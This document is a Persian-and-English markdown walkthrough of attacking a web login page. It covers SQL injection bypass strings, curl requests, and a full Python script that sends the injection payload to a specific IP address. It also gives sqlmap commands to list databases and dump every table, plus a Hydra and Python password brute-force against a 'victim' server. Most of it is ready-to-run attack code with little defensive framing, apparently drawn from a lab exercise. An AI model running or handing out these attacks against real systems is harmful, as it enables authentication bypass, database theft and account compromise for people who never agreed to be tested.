# 1. login with website

```
admin' --
123
```

```
' OR '1'='1' --
123
```

<p dir="rtl" align="justify">
  <ul dir="rtl">
  <li>' : اولین تک کوتیشن، این کار باعث بسته شدن رشته ورودی username می‌شود.</li>
	<li>-- : یک کامنت در SQL است که بقیه کوئری را نادیده می‌گیرد</li>
	<li>نتیجه این می‌شود که شرط WHERE همیشه درست خواهد بود و کوئری اولین کاربر از جدول را برمی‌گرداند (معمولاً کاربر مدیر).</li>
	<li>OR '1'='1' : یک شرط همیشه درست اضافه می‌کند (1 همیشه برابر با 1 است)</li>
  </ul>
</p>


```sql
SELECT * FROM auth_user  WHERE username='{username}' AND password='{password}'
```
```sql
SELECT * FROM vuln_app_user WHERE username='' OR '1'='1' -- ' AND password='...'
```

<p dir="rtl" align="justify">نتیجه نهایی:</p>

```sql
SELECT * FROM auth_user WHERE username='' OR '1'='1'
```



# 2. curl

```
curl -s -c cookies.txt http://82.115.20.217/login/ | grep csrfmiddlewaretoken
```
```
curl -v -X POST "http://82.115.20.217/login/" \
     -H "Cookie: csrftoken=fTDkcTuWu0YS6of9UEdH9ozk4cIASuf49JuLSSwgEoBwZlMaKux2EiWQRLuOiycv" \
     -d "username=' OR '1'='1' --&password=123&csrfmiddlewaretoken=fTDkcTuWu0YS6of9UEdH9ozk4cIASuf49JuLSSwgEoBwZlMaKux2EiWQRLuOiycv"
```

# 3.
```
python3 -m venv myenv
source myenv/bin/activate
pip install requests beautifulsoup4
``` 
```
nano sqli_test.py
```
```python
import requests
from bs4 import BeautifulSoup

# Configure target
login_url = "http://82.115.20.217/login/"
test_username = "admin' OR '1'='1' --"
test_password = "123"

# Create session with browser-like headers
session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Referer": login_url
})

# 1. Get initial cookies and CSRF Token
print("🔄 Initial request to get cookies...")
try:
    response = session.get(login_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
    print(f"✅ CSRF Token: {csrf_token}")
    print(f"🆔 Initial Cookies: {session.cookies.get_dict()}")
except Exception as e:
    print(f"❌ Failed to initialize session: {e}")
    exit()

# 2. Prepare injection data
data = {
    "username": test_username,
    "password": test_password,
    "csrfmiddlewaretoken": csrf_token
}

# 3. Send injection request
print("\n🔥 Sending SQL injection payload...")
try:
    response = session.post(login_url,
                          data=data,
                          allow_redirects=False)
    
    print("\n=== Response Analysis ===")
    print(f"Status Code: {response.status_code}")
    print(f"Response Length: {len(response.text)}")
    print(f"Redirect Location: {response.headers.get('Location', 'None')}")
    print(f"Cookies After Login: {session.cookies.get_dict()}")
    
    # Check for successful login indicators
    if response.status_code == 302:
        print("\n✅✅ Strong indication of successful SQL injection!")
        print(f"Redirects to: {response.headers.get('Location')}")
        
        # Follow the redirect to verify
        redirect_url = response.headers['Location']
        if not redirect_url.startswith('http'):
            redirect_url = f"http://82.115.20.217{redirect_url}"
            
        print("\n🔍 Following redirect...")
        redirect_response = session.get(redirect_url, allow_redirects=False)
        print(f"Redirect Status: {redirect_response.status_code}")
        print(f"Final Cookies: {session.cookies.get_dict()}")
        
    else:
        print("\n⚠️ Unexpected response - possible WAF protection")
        
except requests.exceptions.RequestException as e:
    print(f"\n❌ Request failed: {e}")
```
```
python3 sqli_test.py
```
```
deactivate
```

# 4. sqlmap

<p dir="rtl" align="justify">1. نصب sqlmap (اگر وجود ندارد):</p>

```
sudo apt update && sudo apt install sqlmap
```

<p dir="rtl" align="justify">2. اجرای حمله به صفحه لاگین:</p>

```
sqlmap -u "http://IP-سرور-قربانی/login/" --data="username=admin&password=123" --method=POST --risk=3 --level=5 --dbs
```

<p dir="rtl" align="justify">
  <ul dir="rtl">
    	<li>--data: پارامترهای POST ارسالی.</li>
	<li>--dbs: لیست پایگاه‌های داده را نمایش می‌دهد.</li>
  </ul>
</p>

<p dir="rtl" align="justify">هدف: پیدا کردن لیست دیتابیس‌های موجود (dbs--).</p>


<p dir="rtl" align="justify">برای حمله پیشرفته‌تر:</p>

```
sqlmap -u "http://IP-سرور-قربانی/login/" --data="username=admin&password=123" --method=POST --dump-all
```

<p dir="rtl" align="justify">هدف: استخراج تمام داده‌های تمام جداول از تمام دیتابیس‌ها (dump-all--).</p>

<p dir="rtl" align="justify">
	<ul dir="rtl">
	  <li>کاربرد:
		<ul dir="rtl">
		  <li>.نه تنها نام دیتابیس‌ها، بلکه تمامی جداول، رکوردها و اطلاعات حساس (مثل کاربران، پسوردها، اطلاعات شخصی) را دانلود می‌کند.</li>
		  <li>.یک حمله کامل و تهاجمی است که تمام محتوای دیتابیس را افشا می‌کند.</li>
		</ul>
	  </li>
	</ul>
</p>



# 5. Brute Force

<p dir="rtl" align="justify">1. با ابزارهای خودکار (مثل Hydra)</p>

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt victim-ip http-post-form "/login:username=^USER^&password=^PASS^:F=login_failed.html"
```

<p dir="rtl" align="justify">
  <ul dir="rtl">
    <li>l admin-: نام کاربری هدف.</li>
	<li>P rockyou.txt-: لیست پسوردهای معروف.</li>
	<li>http-post-form: نوع حمله (POST).</li>
	<li>F=login_failed.html: شرط تشخیص شکست (اگر این صفحه نمایش داده شد، پسورد اشتباه است).</li>
  </ul>
</p>


<p dir="rtl" align="justify">2. اسکریپت پایتون ساده</p>

```python
import requests

target_url = "http://victim-ip/login/"
username = "admin"
passwords = ["123456", "password", "admin123", "123"]  # یا از یک فایل بخوانید

for password in passwords:
    data = {"username": username, "password": password}
    response = requests.post(target_url, data=data)
    if "login_success" in response.text:
        print(f"✅ پسورد پیدا شد: {password}")
        break
    else:
        print(f"❌ امتحان شد: {password}")
```
